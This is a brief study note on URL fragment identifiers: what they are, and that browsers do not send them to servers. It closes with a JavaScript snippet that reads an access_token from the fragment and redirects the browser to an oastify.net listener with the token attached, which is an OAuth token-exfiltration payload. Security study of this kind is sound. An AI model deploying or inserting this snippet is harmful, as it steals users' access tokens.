---
tags:
  - web
aliases:
  - URL Fragment
---
The final `#` passed in url that specifies a subordinate resource from the primary document (i.e page headers)
![[Fragment Identifier-20261104013036901.webp]]
# Web Conventions
- Fragment is not sent to the server
- Fragment is used in front-end code.
- Browser terminates everything after and including the # when sending requests
# Script to Extract URL Fragment
If a url looks like `https://mysite.com#access_token=sdF2asa...`
```javascript
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');
window.location = 'https://aaaa.oastify.net/?token='+token;
```